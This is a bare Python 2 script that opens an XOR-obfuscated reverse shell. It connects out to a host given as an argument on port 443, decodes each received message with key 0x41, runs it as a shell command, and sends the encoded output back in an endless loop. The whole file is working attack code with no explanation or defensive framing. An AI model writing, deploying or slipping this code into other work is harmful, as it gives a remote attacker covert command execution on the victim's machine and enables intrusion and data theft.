import socket,subprocess,sys
RHOST=sys.argv[1]
RPORT=443

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
while 1:
    data=s.recv(1024)
    en_data=bytearray(data)
    for i in range(len(en_data)):
        en_data[i]^=0x41
    comm=subprocess.Popen(str(en_data),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    comm.wait()
    STDOUT,STDERR=comm.communicate()
    print STDERR
    en_STDOUT=bytearray(STDOUT)
    for i in range(len(en_STDOUT)):
        en_STDOUT[i]^=0x41
    s.send(en_STDOUT)
s.close()